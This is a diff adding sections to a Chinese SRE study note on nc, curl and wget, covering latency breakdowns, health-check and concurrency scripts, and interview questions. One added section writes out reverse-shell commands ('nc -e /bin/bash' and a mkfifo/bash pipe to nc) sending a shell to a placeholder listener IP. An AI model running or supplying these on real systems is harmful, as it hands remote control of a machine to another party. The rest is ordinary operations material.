@@ -94,6 +94,97 @@ dd if=/dev/zero bs=1M count=100 2>/dev/null | nc -vn <server_ip> 5000
 # 通过传输时间和数据量估算带宽
 ```
 
+#### 1.5 nc 高级用法
+
+**反向 Shell（安全审计用途）：**
+
+```bash
+# 注意: 仅用于授权的安全审计和故障排查
+
+# 监听端 (攻击者/运维人员)
+nc -lvnp 4444
+
+# 目标端 (被管理的服务器)
+# 正向 shell: 将 bash 绑定到网络连接
+nc -e /bin/bash <监听端IP> 4444
+
+# 如果 nc 不支持 -e 参数，使用管道
+mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <监听端IP> 4444 > /tmp/f
+```
+
+**SRE 正规用途：远程调试和日志传输**
+
+```bash
+# 远程日志收集 (服务端)
+nc -lvnp 9999 > /tmp/remote_log.txt
+
+# 远程日志传输 (客户端)
+tail -f /var/log/syslog | nc <日志服务器IP> 9999
+
+# 远程命令输出传输
+# 服务器端执行命令，结果发送到监控端
+while true; do
+    { echo "=== $(date) ==="; top -bn1 | head -20; } | nc <监控端IP> 9999
+    sleep 60
+done
+```
+
+**nc 作为代理：**
+
+```bash
+# 简易 TCP 代理 (端口转发)
+mkfifo /tmp/backpipe
+nc -lvnp 8080 < /tmp/backpipe | nc target-server 80 > /tmp/backpipe
+
+# 更实用的方式: 使用 socat
+socat TCP-LISTEN:8080,fork TCP:target-server:80
+```
+
+**nc 用于服务存活检测：**
+
+```bash
+#!/bin/bash
+# nc_alive_check.sh - 使用 nc 检测服务存活
+# 用法: ./nc_alive_check.sh <host> <port> <timeout>
+
+HOST="$1"
+PORT="$2"
+TIMEOUT="${3:-3}"
+
+if nc -z -w "$TIMEOUT" "$HOST" "$PORT" 2>/dev/null; then
+    echo "ALIVE: $HOST:$PORT"
+    exit 0
+else
+    echo "DEAD: $HOST:$PORT"
+    exit 1
+fi
+```
+
+**nc 传输文件（跨服务器）：**
+
+```bash
+# 方式 1: 简单传输
+# 接收端
+nc -lvnp 9000 > received_file.tar.gz
+
+# 发送端
+nc -vn <接收端IP> 9000 < file.tar.gz
+
+# 方式 2: 带进度的传输
+# 发送端
+pv file.tar.gz | nc -vn <接收端IP> 9000
+
+# 接收端
+nc -lvnp 9000 > received_file.tar.gz
+
+# 方式 3: 带校验的传输
+# 发送端
+sha256sum file.tar.gz && nc -vn <接收端IP> 9000 < file.tar.gz
+
+# 接收端
+nc -lvnp 9000 > received_file.tar.gz && sha256sum received_file.tar.gz
+```
+
 ### 2. curl — HTTP 客户端之王
 
 #### 2.1 curl 时间分解（SRE 核心技能）
@@ -208,6 +299,140 @@ curl --parallel https://a.example.com https://b.example.com https://c.example.co
 | 52 | 服务器返回空响应 | 服务端异常 |
 | 56 | 接收数据失败 | 网络中断 |
 
+#### 2.5 curl --resolve 与 --connect-to
+
+```bash
+# --resolve: 强制将域名解析到指定 IP
+# 场景: 测试新部署的服务器，不修改 DNS
+curl --resolve www.example.com:443:10.0.1.100 https://www.example.com
+
+# --connect-to: 将连接重定向到指定主机
+# 场景: 连接本地代理或测试环境
+curl --connect-to www.example.com:443:test-server:8443 https://www.example.com/api/data
+
+# 对比两者区别:
+# --resolve: 只影响 DNS 解析，SNI 和 Host 头不变
+# --connect-to: 影响实际连接目标，SNI 和 Host 头不变
+
+# 实际测试:
+# 正常访问
+curl -s -o /dev/null -w 'IP: %{remote_ip}\n' https://www.example.com
+
+# 强制解析到新 IP
+curl -s -o /dev/null -w 'IP: %{remote_ip}\n' \
+    --resolve www.example.com:443:10.0.1.100 \
+    https://www.example.com
+
+# 连接到测试环境
+curl -s -o /dev/null -w 'IP: %{remote_ip}\n' \
+    --connect-to www.example.com:443:staging.example.com:443 \
+    https://www.example.com
+```
+
+#### 2.6 curl 并发测试脚本
+
+```bash
+#!/bin/bash
+# curl_concurrent_test.sh - curl 并发请求测试
+# 用法: ./curl_concurrent_test.sh <URL> <并发数> <总请求数>
+
+URL="${1:?用法: $0 <URL> <并发数> <总请求数>}"
+CONCURRENCY="${2:-10}"
+TOTAL="${3:-100}"
+
+echo "=========================================="
+echo "  curl 并发测试"
+echo "  URL: $URL"
+echo "  并发数: $CONCURRENCY"
+echo "  总请求: $TOTAL"
+echo "=========================================="
+
+RESULTS_FILE=$(mktemp)
+trap "rm -f $RESULTS_FILE" EXIT
+
+# 并发执行请求
+for i in $(seq 1 "$TOTAL"); do
+    # 控制并发数
+    while [ $(jobs -r | wc -l) -ge "$CONCURRENCY" ]; do
+        sleep 0.1
+    done
+    
+    (
+        RESULT=$(curl -s -o /dev/null -w '%{http_code} %{time_total} %{time_starttransfer}' \
+            --max-time 10 "$URL" 2>/dev/null)
+        echo "$RESULT" >> "$RESULTS_FILE"
+    ) &
+done
+
+# 等待所有请求完成
+wait
+
+# 统计结果
+TOTAL_REQUESTS=$(wc -l < "$RESULTS_FILE")
+SUCCESS=$(awk '$1 >= 200 && $1 < 400' "$RESULTS_FILE" | wc -l)
+FAILED=$(awk '$1 >= 400 || $1 == 0' "$RESULTS_FILE" | wc -l)
+AVG_TOTAL=$(awk '{sum+=$2} END {printf "%.3f", sum/NR}' "$RESULTS_FILE")
+AVG_TTFB=$(awk '{sum+=$3} END {printf "%.3f", sum/NR}' "$RESULTS_FILE")
+P95_TTFB=$(awk '{print $3}' "$RESULTS_FILE" | sort -n | awk '{a[NR]=$1} END {printf "%.3f", a[int(NR*0.95)]}')
+P99_TTFB=$(awk '{print $3}' "$RESULTS_FILE" | sort -n | awk '{a[NR]=$1} END {printf "%.3f", a[int(NR*0.99)]}')
+MIN_TTFB=$(awk '{print $3}' "$RESULTS_FILE" | sort -n | head -1)
+MAX_TTFB=$(awk '{print $3}' "$RESULTS_FILE" | sort -n | tail -1)
+
+echo ""
+echo "=========================================="
+echo "  测试结果"
+echo "=========================================="
+echo "  总请求数:   $TOTAL_REQUESTS"
+echo "  成功:       $SUCCESS"
+echo "  失败:       $FAILED"
+echo "  成功率:     $(awk "BEGIN {printf \"%.1f\", $SUCCESS/$TOTAL_REQUESTS*100}")%"
+echo "  平均总耗时: ${AVG_TOTAL}s"
+echo "  平均 TTFB:  ${AVG_TTFB}s"
+echo "  P95 TTFB:   ${P95_TTFB}s"
+echo "  P99 TTFB:   ${P99_TTFB}s"
+echo "  最小 TTFB:  ${MIN_TTFB}s"
+echo "  最大 TTFB:  ${MAX_TTFB}s"
+echo "=========================================="
+```
+
+#### 2.7 curl 调试 HTTP 问题
+
+```bash
+# 查看完整请求和响应 (包括 Body)
+curl -v -X POST https://api.example.com/data \
+    -H "Content-Type: application/json" \
+    -d '{"key":"value"}'
+
+# 只看响应头
+curl -sI https://www.example.com
+
+# 查看重定向链
+curl -sI -L https://example.com 2>&1 | grep -E "HTTP/|Location:"
+
+# 跟踪重定向并显示每步的 URL
+curl -sL -o /dev/null -w '%{url_effective}\n' https://example.com
+
+# 显示请求的详细信息 (不含响应体)
+curl -v --head https://www.example.com
+
+# 保存完整的请求-响应到文件
+curl -v --trace /tmp/curl_trace.log https://www.example.com
+
+# 使用 curl 发送 multipart/form-data
+curl -X POST https://api.example.com/upload \
+    -F "file=@/path/to/file.txt" \
+    -F "description=test upload"
+
+# 发送 JSON 并美化响应
+curl -s https://api.example.com/data | python3 -m json.tool
+
+# 或者使用 jq
+curl -s https://api.example.com/data | jq '.'
+
+# 测试 API 并检查特定字段
+curl -s https://api.example.com/health | jq '.status == "ok"'
+```
+
 ### 3. wget — 下载利器
 
 #### 3.1 wget 常用命令
@@ -261,6 +486,106 @@ wget --spider https://example.com/file.zip
 | Cookie | 支持 | 支持 |
 | 代理 | 支持 | 支持 |
 | SRE 推荐 | ⭐⭐⭐⭐⭐ (API 测试/诊断) | ⭐⭐⭐ (文件下载) |
+
+#### 3.3 wget 递归下载与镜像网站
+
+```bash
+# 递归下载整个网站 (镜像)
+wget --mirror --convert-links --adjust-extension --page-requisites \
+    --no-parent https://www.example.com/docs/
+
+# 参数解释:
+# --mirror (-r -N -l inf): 递归下载，无限深度
+# --convert-links (-k): 将链接转换为本地相对路径
+# --adjust-extension (-E): 为 HTML 文件添加 .html 扩展名
+# --page-requisites (-p): 下载页面所需的所有资源 (CSS/JS/图片)
+# --no-parent (-np): 不爬取上级目录
+
+# 限制递归深度
+wget -r -l 3 https://www.example.com
+
+# 只下载特定类型的文件
+wget -r -A "*.pdf,*.doc" https://www.example.com/documents/
+
+# 排除特定目录
+wget -r --exclude-directories=/admin,/private https://www.example.com
+
+# 下载并保持网站结构
+wget --mirror -p --convert-links -P ./local_site https://www.example.com
+
+# 限速递归下载 (避免影响目标服务器)
+wget --mirror --limit-rate=500k --wait=1 https://www.example.com
+```
+
+#### 3.4 wget 高级下载技巧
+
+```bash
+# 断点续传 (大文件必备)
+wget -c https://example.com/large_file.zip
+
+# 后台下载
+wget -b https://example.com/large_file.zip
+# 查看下载进度: tail -f wget-log
+
+# 限速下载 (不影响其他网络使用)
+wget --limit-rate=2m https://example.com/file.zip
+
+# 自动重试
+wget --tries=10 --retry-connrefused --waitretry=5 https://example.com/file.zip
+
+# 设置超时
+wget --timeout=30 --dns-timeout=10 --connect-timeout=10 https://example.com/file.zip
+
+# 使用代理
+wget -e use_proxy=yes -e http_proxy=http://proxy:8080 https://example.com/file.zip
+
+# 批量下载 (从文件读取 URL)
+# urls.txt 内容:
+# https://example.com/file1.zip
+# https://example.com/file2.zip
+wget -i urls.txt -P ./downloads/
+
+# 下载并重命名
+wget -O custom_name.zip https://example.com/long/path/to/file.zip
+
+# 只下载比本地新的文件
+wget -N https://example.com/updated_file.zip
+
+# 静默模式 (适合 cron 任务)
+wget -q https://example.com/file.zip
+```
+
+#### 3.5 wget vs curl 深度对比
+
+| 场景 | 推荐工具 | 原因 |
+|------|---------|------|
+| API 测试 | curl | 更好的 HTTP 方法控制、Header 处理 |
+| 文件下载 | wget | 断点续传、递归下载、后台下载 |
+| 网站镜像 | wget | 原生支持递归下载 |
+| 脚本集成 | curl | 输出到 stdout，便于管道处理 |
+| 时间分解 | curl | -w 参数支持丰富的时间变量 |
+| HTTP 调试 | curl | -v 输出更详细 |
+| 批量下载 | wget | -i 参数原生支持 |
+| 限速下载 | 两者都行 | 都支持 --limit-rate |
+
+```bash
+# 相同功能的对比
+# 下载文件
+curl -O https://example.com/file.zip        # curl
+wget https://example.com/file.zip           # wget
+
+# 断点续传
+curl -C - -O https://example.com/file.zip   # curl
+wget -c https://example.com/file.zip        # wget
+
+# 限速
+curl --limit-rate 1M -O https://example.com/file.zip  # curl
+wget --limit-rate=1m https://example.com/file.zip     # wget
+
+# 代理
+curl -x http://proxy:8080 https://example.com  # curl
+wget -e use_proxy=yes -e http_proxy=http://proxy:8080 https://example.com  # wget
+```
 
 ---
 
@@ -360,6 +685,256 @@ mysql -u root -p
 mysql> CREATE USER 'app_user'@'10.0.1.%' IDENTIFIED BY 'password';
 mysql> GRANT ALL PRIVILEGES ON app_db.* TO 'app_user'@'10.0.1.%';
 mysql> FLUSH PRIVILEGES;
+```
+
+### 案例 2：curl 时间分解分析 API 延迟
+
+#### 背景
+
+用户反馈 API 响应慢，但服务端监控显示处理时间正常（< 100ms）。
+
+#### 排查过程
+
+```bash
+# 使用 curl 时间分解分析各阶段耗时
+curl -s -o /dev/null -w '
+  DNS 解析:    %{time_namelookup}s
+  TCP 连接:    %{time_connect}s
+  TLS 握手:    %{time_appconnect}s
+  服务端处理:  %{time_starttransfer}s
+  总耗时:      %{time_total}s
+  HTTP 状态:   %{http_code}
+' https://api.example.com/data
+```
+
+**输出结果：**
+
+```
+  DNS 解析:    0.025s        ← 正常 (< 50ms)
+  TCP 连接:    0.085s        ← 正常 (< 100ms)
+  TLS 握手:    0.250s        ← 偏慢！正常应 < 100ms
+  服务端处理:  0.350s        ← 正常 (< 200ms)
+  总耗时:      0.380s
+```
+
+**分析：**
+
+```
+TLS 握手耗时 = time_appconnect - time_connect = 0.250 - 0.085 = 0.165s
+
+可能原因:
+1. 证书链过长 (需要多次往返验证)
+2. 使用了 RSA 密钥交换 (不支持前向保密，握手慢)
+3. 服务器未启用 OCSP Stapling (需要额外查询证书状态)
+4. 服务器未启用会话恢复
+```
+
+**解决步骤：**
+
+```bash
+# 1. 检查证书链长度
+openssl s_client -connect api.example.com:443 -showcerts < /dev/null 2>/dev/null | \
+  grep -c "BEGIN CERTIFICATE"
+# 结果: 4 个证书 (根 + 2个中间 + 服务器) → 太长了！
+
+# 2. 检查 TLS 版本
+openssl s_client -connect api.example.com:443 < /dev/null 2>/dev/null | grep "Protocol"
+# 结果: TLSv1.2 → 应该升级到 TLS 1.3
+
+# 3. 检查 OCSP Stapling
+openssl s_client -connect api.example.com:443 -status < /dev/null 2>/dev/null | \
+  grep "OCSP Response Status"
+# 结果: 无 OCSP Stapling → 需要启用
+```
+
+**优化措施：**
+
+```nginx
+# Nginx 优化配置
+ssl_protocols TLSv1.2 TLSv1.3;
+ssl_certificate /etc/nginx/ssl/fullchain.pem;  # 包含完整证书链
+ssl_stapling on;
+ssl_stapling_verify on;
+ssl_session_cache shared:SSL:10m;
+ssl_session_timeout 10m;
+ssl_session_tickets on;
+```
+
+**优化后验证：**
+
+```bash
+curl -s -o /dev/null -w '
+  TLS 握手:    %{time_appconnect}s
+  总耗时:      %{time_total}s
+' https://api.example.com/data
+
+# 结果:
+#   TLS 握手:    0.045s  ← 从 0.250s 降到 0.045s
+#   总耗时:      0.180s  ← 从 0.380s 降到 0.180s
+```
+
+### 案例 3：编写综合健康检查脚本
+
+```bash
+#!/bin/bash
+# comprehensive_health_check.sh - 综合服务健康检查
+# 支持 HTTP/TCP/DNS/SSL 多种检查
+
+set -uo pipefail
+
+# 配置文件
+CONFIG_FILE="${1:-/etc/health_check.conf}"
+
+# 颜色
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+# 告警阈值
+HTTP_TIMEOUT=10       # HTTP 请求超时 (秒)
+TTFB_THRESHOLD=1.0    # TTFB 阈值 (秒)
+TCP_TIMEOUT=3         # TCP 连接超时 (秒)
+SSL_EXPIRE_DAYS=30    # SSL 证书过期告警 (天)
+
+log() {
+    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
+}
+
+# HTTP 检查 (带时间分解)
+check_http() {
+    local name="$1" url="$2" expected_code="${3:-200}"
+    
+    local timing
+    timing=$(curl -s -o /dev/null -w '%{http_code}|%{time_namelookup}|%{time_connect}|%{time_appconnect}|%{time_starttransfer}|%{time_total}' \
+        --max-time "$HTTP_TIMEOUT" "$url" 2>/dev/null)
+    
+    local exit_code=$?
+    if [ $exit_code -ne 0 ]; then
+        log "${RED}[FAIL]${NC} HTTP $name: 请求失败 (curl 退出码: $exit_code)"
+        return 1
+    fi
+    
+    IFS='|' read -r code dns tcp tls ttfb total <<< "$timing"
+    
+    if [ "$code" != "$expected_code" ]; then
+        log "${RED}[FAIL]${NC} HTTP $name: 期望 $expected_code, 实际 $code"
+        return 1
+    fi
+    
+    # 检查 TTFB
+    local is_slow
+    is_slow=$(awk "BEGIN {print ($ttfb > $TTFB_THRESHOLD) ? 1 : 0}")
+    
+    if [ "$is_slow" -eq 1 ]; then
+        log "${YELLOW}[WARN]${NC} HTTP $name: TTFB=${ttfb}s (阈值: ${TTFB_THRESHOLD}s)"
+        log "         DNS=${dns}s TCP=${tcp}s TLS=${tls}s"
+    else
+        log "${GREEN}[OK]${NC}   HTTP $name: $code TTFB=${ttfb}s"
+    fi
+}
+
+# SSL 证书过期检查
+check_ssl() {
+    local name="$1" host="$2" port="${3:-443}"
+    
+    local expiry
+    expiry=$(echo | openssl s_client -connect "$host:$port" -servername "$host" 2>/dev/null | \
+        openssl x509 -noout -enddate 2>/dev/null | sed 's/notAfter=//')
+    
+    if [ -z "$expiry" ]; then
+        log "${RED}[FAIL]${NC} SSL  $name: 无法获取证书信息"
+        return 1
+    fi
+    
+    local expiry_epoch
+    expiry_epoch=$(date -d "$expiry" +%s 2>/dev/null)
+    local now_epoch
+    now_epoch=$(date +%s)
+    local days_left=$(( (expiry_epoch - now_epoch) / 86400 ))
+    
+    if [ "$days_left" -lt 0 ]; then
+        log "${RED}[FAIL]${NC} SSL  $name: 证书已过期 ${days_left#-} 天!"
+        return 1
+    elif [ "$days_left" -lt "$SSL_EXPIRE_DAYS" ]; then
+        log "${YELLOW}[WARN]${NC} SSL  $name: 证书将在 ${days_left} 天后过期"
+        return 1
+    else
+        log "${GREEN}[OK]${NC}   SSL  $name: 证书有效 ${days_left} 天"
+    fi
+}
+
+# TCP 端口检查
+check_tcp() {
+    local name="$1" host="$2" port="$3"
+    
+    if nc -z -w "$TCP_TIMEOUT" "$host" "$port" 2>/dev/null; then
+        log "${GREEN}[OK]${NC}   TCP  $name: $host:$port 可达"
+    else
+        log "${RED}[FAIL]${NC} TCP  $name: $host:$port 不可达"
+        return 1
+    fi
+}
+
+# DNS 检查
+check_dns() {
+    local name="$1" domain="$2" expected_ip="$3"
+    
+    local ip
+    ip=$(dig +short "$domain" 2>/dev/null | head -1)
+    
+    if [ -z "$ip" ]; then
+        log "${RED}[FAIL]${NC} DNS  $name: $domain 解析失败"
+        return 1
+    elif [ -n "$expected_ip" ] && [ "$ip" != "$expected_ip" ]; then
+        log "${YELLOW}[WARN]${NC} DNS  $name: $domain → $ip (期望: $expected_ip)"
+    else
+        log "${GREEN}[OK]${NC}   DNS  $name: $domain → $ip"
+    fi
+}
+
+# ============================================
+# 主检查流程
+# ============================================
+log "╔══════════════════════════════════════════╗"
+log "║       综合服务健康检查                      ║"
+log "╚══════════════════════════════════════════╝"
+echo ""
+
+TOTAL=0; PASSED=0; FAILED=0
+
+# 定义检查项
+run_check() {
+    TOTAL=$((TOTAL + 1))
+    if "$@"; then
+        PASSED=$((PASSED + 1))
+    else
+        FAILED=$((FAILED + 1))
+    fi
+}
+
+# HTTP 检查
+run_check check_http "生产首页" "https://www.example.com" "200"
+run_check check_http "API 健康" "https://api.example.com/health" "200"
+
+# SSL 检查
+run_check check_ssl "主站证书" "www.example.com"
+run_check check_ssl "API 证书" "api.example.com"
+
+# TCP 检查
+run_check check_tcp "数据库" "db.example.com" "3306"
+run_check check_tcp "Redis" "redis.example.com" "6379"
+
+# DNS 检查
+run_check check_dns "主域名" "www.example.com"
+run_check check_dns "API 域名" "api.example.com"
+
+echo ""
+log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+log "检查完成: 总计=$TOTAL 通过=$PASSED 失败=$FAILED"
+log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+[ "$FAILED" -eq 0 ] && exit 0 || exit 1
 ```
 
 #### 经验总结
@@ -696,6 +1271,161 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 
 ---
 
+## 🎯 面试题精选
+
+### 面试题 1：curl 和 wget 有什么区别？什么时候用哪个？
+
+**参考答案：**
+
+| 方面 | curl | wget |
+|------|------|------|
+| 默认行为 | 输出到 stdout | 保存到文件 |
+| 协议支持 | 极广 (HTTP/HTTPS/FTP/SMTP/IMAP/LDAP 等) | 较少 (HTTP/HTTPS/FTP) |
+| 递归下载 | 不支持 | 支持 (-r --mirror) |
+| API 测试 | 非常方便 (-X/-d/-H) | 不方便 |
+| 时间分解 | 支持 (-w 格式化输出) | 不支持 |
+| 断点续传 | 支持 (-C -) | 支持 (-c) |
+| 脚本集成 | 优秀 (输出到 stdout) | 一般 |
+
+使用场景：
+- **curl**：API 测试、HTTP 调试、时间分解、脚本集成
+- **wget**：文件下载、网站镜像、递归下载、后台下载
+
+### 面试题 2：如何用 curl 调试 HTTP 问题？
+
+**参考答案：**
+
+```bash
+# 1. 查看完整请求-响应 (包括 TLS 握手)
+curl -vvv https://api.example.com
+
+# 2. 时间分解 (定位性能瓶颈)
+curl -s -o /dev/null -w 'DNS:%{time_namelookup} TCP:%{time_connect} TLS:%{time_appconnect} TTFB:%{time_starttransfer}\n' URL
+
+# 3. 只看响应头
+curl -sI URL
+
+# 4. 查看重定向链
+curl -sIL URL 2>&1 | grep "HTTP\|Location"
+
+# 5. 强制解析 (测试新服务器)
+curl --resolve domain:443:new-ip https://domain
+
+# 6. 发送特定 HTTP 方法和 Body
+curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' URL
+
+# 7. 保存详细日志
+curl --trace /tmp/curl.log URL
+```
+
+### 面试题 3：curl -w 中的 time_connect 和 time_appconnect 分别代表什么？
+
+**参考答案：**
+
+- `time_connect`：从开始到 TCP 三次握手完成的时间（包含 DNS 解析）
+- `time_appconnect`：从开始到 TLS 握手完成的时间（包含 DNS + TCP + TLS）
+
+计算各阶段独立耗时：
+- DNS 解析 = time_namelookup
+- TCP 握手 = time_connect - time_namelookup
+- TLS 握手 = time_appconnect - time_connect
+- 服务端处理 = time_starttransfer - time_appconnect
+
+### 面试题 4：nc 测试端口通但应用连不上，可能是什么原因？
+
+**参考答案：**
+
+可能原因：
+1. **bind-address 问题**：服务只监听 127.0.0.1，nc 在本地测试通过但远程访问失败
+2. **防火墙规则**：nc 测试时临时放行，或 iptables/nftables 规则不一致
+3. **连接数限制**：服务端连接数已满，nc 测试时刚好有空位
+4. **协议不匹配**：nc 测试 TCP 端口通，但应用层协议不同（如 MySQL 握手失败）
+5. **超时设置**：nc 超时较长，应用超时较短
+6. **源地址限制**：服务端有 IP 白名单，nc 从允许的地址测试
+
+排查步骤：
+```bash
+# 1. 从正确的位置测试 (客户端，不是服务器本地)
+nc -zv target-host 3306
+
+# 2. 检查服务监听地址
+ss -tlnp | grep 3306
+
+# 3. 检查防火墙规则
+iptables -L -n | grep 3306
+
+# 4. 检查连接数
+ss -s | grep -i tcp
+
+# 5. 使用 curl/telnet 测试应用层
+curl -v telnet://target-host:3306
+```
+
+### 面试题 5：如何用 curl 模拟用户登录并保持会话？
+
+**参考答案：**
+
+```bash
+# 方式 1: 使用 Cookie 文件
+# 第一步: 登录，保存 Cookie
+curl -c cookies.txt -X POST https://example.com/login \
+    -d "username=admin&password=secret"
+
+# 第二步: 使用 Cookie 访问受保护页面
+curl -b cookies.txt https://example.com/dashboard
+
+# 方式 2: 使用 Session
+# 保存和加载 Cookie
+curl -c /tmp/cookies -b /tmp/cookies https://example.com/login \
+    -d "username=admin&password=secret"
+curl -b /tmp/cookies https://example.com/dashboard
+
+# 方式 3: 使用 -L 自动跟随重定向
+curl -c cookies.txt -L -X POST https://example.com/login \
+    -d "username=admin&password=secret"
+```
+
+### 面试题 6：wget 的 --mirror 和 -r 有什么区别？
+
+**参考答案：**
+
+`--mirror` 等价于 `-r -N -l inf --no-remove-listing`：
+- `-r`：递归下载
+- `-N`：启用时间戳，只下载比本地新的文件
+- `-l inf`：无限递归深度
+- `--no-remove-listing`：保留 FTP 目录列表
+
+`--mirror` 适合网站镜像，因为它会：
+- 保持与远程相同的文件更新状态
+- 不限制递归深度
+- 保留 FTP 列表文件
+
+`-r` 更灵活，可以自定义深度 (`-l 3`)、文件类型 (`-A`)、排除目录等。
+
+### 面试题 7：如何用 nc 进行端口扫描？与 nmap 有什么区别？
+
+**参考答案：**
+
+```bash
+# nc 端口扫描
+nc -zv 192.168.1.100 1-1024
+
+# nmap 端口扫描
+nmap -sT 192.168.1.100          # TCP Connect 扫描
+nmap -sS 192.168.1.100          # SYN 扫描 (半开)
+nmap -sU 192.168.1.100          # UDP 扫描
+```
+
+区别：
+- nc：简单、无需额外安装、只支持 TCP Connect 扫描
+- nmap：功能强大、支持多种扫描方式、服务版本检测、OS 检测、脚本引擎
+
+SRE 场景：
+- nc：快速验证端口连通性、临时使用
+- nmap：安全审计、全面扫描、服务发现
+
+---
+
 ## 📝 笔记
 
 ### 今日总结
@@ -710,6 +1440,8 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
    - 理解 `127.0.0.1` vs `0.0.0.0` vs 具体 IP 的区别
 
 4. **curl --resolve** 是测试新服务器/新配置的利器，无需修改 DNS 或 `/etc/hosts` 即可强制指定解析结果。
+
+5. **wget 递归下载** 是网站镜像和批量下载的利器，`--mirror` 参数是最便捷的方式。
 
 ### 问题记录
 
@@ -753,6 +1485,35 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 | Day 35 | 从 URL 到页面的完整过程 | ⭐⭐⭐⭐ |
 | Day 36 | ping/traceroute/mtr/dig | ⭐⭐⭐⭐ |
 | Day 37 | nc/curl/wget 进阶 | ⭐⭐⭐⭐ |
+
+---
+
+## ✅ 自检清单
+
+### 理论检查点
+- [ ] 能解释 nc 的 TCP/UDP 连接测试原理
+- [ ] 能说明 curl -w 各时间变量的含义和计算方式
+- [ ] 能解释 bind-address 问题的根本原因
+- [ ] 能区分 curl 和 wget 的适用场景
+- [ ] 能说明 wget --mirror 与 -r 的区别
+- [ ] 能解释 curl --resolve 和 --connect-to 的区别
+
+### 实操检查点
+- [ ] 能用 nc 进行端口扫描和文件传输
+- [ ] 能用 curl -w 输出各阶段耗时
+- [ ] 能用 curl --resolve 测试新服务器
+- [ ] 能用 wget 递归下载网站
+- [ ] 能用 wget 断点续传大文件
+- [ ] 能编写综合健康检查脚本 (HTTP/TCP/DNS/SSL)
+- [ ] 能编写 curl 并发测试脚本
+- [ ] 能用 nc 搭建简易服务器进行调试
+
+### 故障排查能力检查
+- [ ] 能通过 curl 时间分解定位 TLS 性能问题
+- [ ] 能通过 nc/ss 排查 bind-address 问题
+- [ ] 能通过 curl -v 分析 HTTP 请求-响应细节
+- [ ] 能通过 wget --spider 检查文件是否存在
+- [ ] 能编写自动化健康检查并集成告警
 
 ---
 
